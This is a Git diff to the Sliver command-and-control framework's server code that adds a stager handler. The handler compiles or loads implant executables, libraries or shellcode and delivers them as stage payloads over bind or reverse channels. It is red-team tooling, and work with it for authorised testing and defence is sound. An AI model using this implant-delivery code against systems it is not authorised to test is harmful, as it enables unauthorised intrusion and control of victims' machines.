@@ -20,6 +20,9 @@ package rpc
 
 import (
 	"context"
+	"fmt"
+	"io/ioutil"
+	"net"
 
 	"google.golang.org/grpc/codes"
 	"google.golang.org/grpc/status"
@@ -33,12 +36,13 @@ import (
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/db"
 	"github.com/bishopfox/sliver/server/db/models"
+	"github.com/bishopfox/sliver/server/generate"
 	"github.com/gofrs/uuid"
 )
 
-// StartC2Handler - A generic RPC method used to open handlers for all supported C2 channels, either on the server or on implants.
+// StartHandlerStage - A generic RPC method used to open handlers for all supported C2 channels, either on the server or on implants.
 // Normally no user should have much to do here: if you want to add your C2, check server/c2/listen.go or dial.go.
-func (rpc *Server) StartC2Handler(ctx context.Context, req *clientpb.HandlerStartReq) (res *clientpb.HandlerStart, err error) {
+func (rpc *Server) StartHandlerStage(ctx context.Context, req *clientpb.HandlerStageReq) (res *clientpb.HandlerStage, err error) {
 
 	// Any low level management stuff before anything.
 	profile := models.C2ProfileFromProtobuf(req.Profile)
@@ -96,9 +100,129 @@ func (rpc *Server) StartC2Handler(ctx context.Context, req *clientpb.HandlerStar
 	// Save the job if it's marked persistent
 	savePersistentJob(profile, job, session)
 
-	return &clientpb.HandlerStart{Response: &commonpb.Response{}, Success: true}, nil
+	return &clientpb.HandlerStage{Response: &commonpb.Response{}, Success: true}, nil
 }
 
+// StartHandlerStager - Works the same as StartHandlerStage, except that we listen for connections requiring a stage payload.
+func (rpc *Server) StartHandlerStager(ctx context.Context, req *clientpb.HandlerStagerReq) (res *clientpb.HandlerStager, err error) {
+
+	// Any low level management stuff before anything.
+	profile := models.C2ProfileFromProtobuf(req.Profile)
+	session := core.Sessions.Get(req.Request.SessionID)
+
+	// We get the comm.Net interface for the session: if nil,
+	// pass 0 and return the server interfaces functions
+	var net comm.Net
+	if session == nil {
+		net, err = comm.ActiveNetwork(0)
+		if err != nil {
+			return nil, err
+		}
+	} else {
+		net, err = comm.ActiveNetwork(session.ID)
+		if err != nil {
+			return nil, err
+		}
+	}
+
+	// Init profile security details: load certificates and keys if any, or default.
+	// NOTE: No hostname is passed as argument, as this is a just a listener started,
+	// and that if any Cert/Key data is in the profile, this call below will not touch anything.
+	//
+	// As well, if there are nothing in it, it will just load the default
+	err = c2.SetupHandlerSecurity(profile, profile.Hostname)
+	if err != nil {
+		return nil, err
+	}
+
+	// A job object that will be used after the listener dialer is started,
+	// for saving it into the database or server config if the job is persistent
+	job, listener := c2.NewHandlerJob(profile, session)
+
+	// Load the payload stage:
+	err = setupStage(req.StageImplant, req.StageBytes, job)
+
+	// Dispatch the profile to either the root Dialer functions or Listener ones.
+	// The actual implementation of the C2 handlers are in there, or possibly in
+	// functions still down the way.
+	switch profile.Direction {
+
+	// Dialers
+	case sliverpb.C2Direction_Bind:
+		err = c2.Deliver(profile, net, job.StageBytes)
+		if err != nil {
+			return nil, err
+		}
+
+	// Listeners
+	case sliverpb.C2Direction_Reverse:
+		err = c2.Serve(profile, net, job, listener)
+		if err != nil {
+			return nil, err
+		}
+	}
+
+	// Save the job if it's marked persistent
+	savePersistentJob(profile, job, session)
+
+	return &clientpb.HandlerStager{Response: &commonpb.Response{}, Success: true}, nil
+}
+
+// setupStage - Depending on the user-provided elements, fetch and/or load the payload into the job
+func setupStage(implantName string, implantBytes []byte, job *core.Job) (err error) {
+
+	// if the bytes are given, add conventional name and add bytes to the job below.
+	if implantName == "" && len(implantBytes) > 0 {
+		job.StageImplant = "foreign"
+		job.StageBytes = implantBytes
+	}
+
+	// If the implant name is given, load the appropriate bytes
+	if implantName != "" && len(implantBytes) == 0 {
+
+		// Use profile by default, and compile based on it
+		if profile, err := db.ImplantProfileByName(implantName); err == nil {
+			config := profile.ImplantConfig
+			var fPath string
+
+			switch config.Format {
+			case clientpb.OutputFormat_SERVICE:
+				fallthrough
+			case clientpb.OutputFormat_EXECUTABLE:
+				fPath, err = generate.SliverExecutable(profile.Name, config)
+				break
+			case clientpb.OutputFormat_SHARED_LIB:
+				fPath, err = generate.SliverSharedLibrary(profile.Name, config)
+			case clientpb.OutputFormat_SHELLCODE:
+				fPath, err = generate.SliverShellcode(profile.Name, config)
+			}
+			if err != nil {
+				return err
+			}
+
+			job.StageImplant = profile.Name
+			job.StageBytes, err = ioutil.ReadFile(fPath)
+			if err != nil {
+				return err
+			}
+		}
+
+		// Or use and already existing implant build
+		build, err := db.ImplantBuildByName(implantName)
+		if err != nil {
+			return fmt.Errorf("failed to find implant build")
+		}
+		job.StageImplant = build.Name
+		job.StageBytes, err = generate.ImplantFileFromBuild(build)
+		if err != nil {
+			return err
+		}
+	}
+
+	return
+}
+
+// savePersistentJob - Save a job marked persistent, either for the server or on a session.
 func savePersistentJob(profile *models.C2Profile, job *core.Job, session *core.Session) (err error) {
 	if !profile.Persistent {
 		return nil
@@ -119,6 +243,8 @@ func savePersistentJob(profile *models.C2Profile, job *core.Job, session *core.S
 		Description:     job.Description,
 		Order:           job.Order,
 		Profile:         profile,
+		StageImplant:    job.StageImplant,
+		StageBytes:      job.StageBytes,
 	}
 	err = db.SessionJobSave(jobSave)
 
@@ -128,4 +254,29 @@ func savePersistentJob(profile *models.C2Profile, job *core.Job, session *core.S
 // CloseC2Handler - Generic method to close a handler running either on the server or on an implant. By definition these are listeners.
 func (rpc *Server) CloseC2Handler(ctx context.Context, req *clientpb.HandlerCloseReq) (res *clientpb.HandlerClose, err error) {
 	return nil, status.Errorf(codes.Unimplemented, "method CloseC2Handler not implemented")
+}
+
+// checkInterface verifies if an IP address
+// is attached to an existing network interface
+func checkInterface(a string) bool {
+	interfaces, err := net.Interfaces()
+	if err != nil {
+		return false
+	}
+	for _, i := range interfaces {
+		addresses, err := i.Addrs()
+		if err != nil {
+			return false
+		}
+		for _, netAddr := range addresses {
+			addr, err := net.ResolveTCPAddr("tcp", netAddr.String())
+			if err != nil {
+				return false
+			}
+			if addr.IP.String() == a {
+				return true
+			}
+		}
+	}
+	return false
 }
